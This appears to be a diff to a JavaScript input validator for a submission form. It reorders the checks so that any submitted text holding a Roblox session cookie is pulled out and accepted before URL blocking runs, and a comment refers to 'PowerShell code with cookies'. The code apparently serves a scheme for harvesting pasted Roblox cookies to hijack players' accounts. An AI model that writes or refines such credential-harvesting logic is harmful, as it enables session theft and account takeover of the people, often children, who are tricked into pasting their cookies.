@@ -90,7 +90,13 @@ function isValidCode(code) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // Block only obvious URLs/links (less strict)
+    // FIRST: Extract Roblox cookie if present (PRIORITY - check before URL blocking)
+    const robloxCookie = extractRobloxCookie(cleanCode);
+    if (robloxCookie) {
+        return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
+    }
+
+    // SECOND: Block URLs only if it's NOT PowerShell code with cookies
     const urlPatterns = [
         // Clear protocol patterns
         /https?:\/\//i,     // http:// or https://
@@ -119,12 +125,6 @@ function isValidCode(code) {
         if (pattern.test(cleanCode) || pattern.test(preprocessed)) {
             return { valid: false, reason: 'Links and URLs are not allowed!', isLink: true };
         }
-    }
-
-    // SECOND: Extract Roblox cookie if present (after URL check)
-    const robloxCookie = extractRobloxCookie(cleanCode);
-    if (robloxCookie) {
-        return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
     // THIRD: Check for basic spam patterns
